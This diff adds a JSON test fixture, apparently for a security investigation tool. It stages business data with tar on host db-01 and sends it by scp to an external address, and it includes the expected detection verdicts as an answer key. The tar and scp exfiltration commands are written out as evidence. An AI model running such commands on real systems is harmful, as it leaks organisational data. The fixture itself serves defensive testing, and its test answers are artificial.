@@ -1,0 +1,78 @@
+{
+  "investigation_intent": "db-01 在临时目录打包业务数据并通过 scp 外发，识别外传候选行为",
+  "scenario": "S7",
+  "risk_modules": ["exec", "connect"],
+  "params": {
+    "host": "db-01",
+    "time_start": "2026-06-24T02:00:00+08:00",
+    "time_end": "2026-06-24T03:00:00+08:00",
+    "severity_floor": "P1"
+  },
+  "completeness_precheck": {
+    "overall_verdict": "partial_traceable",
+    "confidence": 0.78,
+    "next_skill_blocked": false,
+    "data_gaps": ["network_traffic_audit missing"]
+  },
+  "evidence_bundles": {
+    "host_exec": [
+      {
+        "evidence_id": "exec-stage-001",
+        "event_type": "exec",
+        "host": "db-01",
+        "host_ip": "10.0.2.10",
+        "timestamp": "2026-06-24T02:15:00+08:00",
+        "listener_port": 5432,
+        "listener_process": "postgres",
+        "listener_pid": 6100,
+        "pid": "7249",
+        "ppid": "6100",
+        "exe": "/usr/bin/tar",
+        "command": "tar -C /var/www/app -czf /tmp/app-backup.tgz .",
+        "command_line": "tar -C /var/www/app -czf /tmp/app-backup.tgz .",
+        "cwd": "/tmp"
+      },
+      {
+        "evidence_id": "exec-transfer-001",
+        "event_type": "exec",
+        "host": "db-01",
+        "host_ip": "10.0.2.10",
+        "timestamp": "2026-06-24T02:17:00+08:00",
+        "listener_port": 5432,
+        "listener_process": "postgres",
+        "listener_pid": 6100,
+        "pid": "7250",
+        "ppid": "6100",
+        "exe": "/usr/bin/scp",
+        "command": "scp /tmp/app-backup.tgz analyst@198.51.100.42:/incoming/",
+        "command_line": "scp /tmp/app-backup.tgz analyst@198.51.100.42:/incoming/",
+        "cwd": "/tmp"
+      }
+    ],
+    "host_connect": [
+      {
+        "evidence_id": "connect-transfer-001",
+        "event_type": "active_connect",
+        "host": "db-01",
+        "host_ip": "10.0.2.10",
+        "timestamp": "2026-06-24T02:17:02+08:00",
+        "listener_port": 5432,
+        "listener_process": "postgres",
+        "listener_pid": 6100,
+        "pid": "7250",
+        "process": "scp",
+        "dst_ip": "198.51.100.42",
+        "dst_port": 22
+      }
+    ],
+    "host_file_op": []
+  },
+  "_meta": {
+    "scenario_label": "S7 数据暂存与 SCP 外发候选（合成文档地址）",
+    "expected_overall_verdict": "high_risk_detected",
+    "expected_highest_severity": "P0",
+    "expected_matched_rules": ["data_staging", "network_exfil_tools"],
+    "expected_risk_modules": ["exec"],
+    "expected_unproven_claim": "transfer_success"
+  }
+}
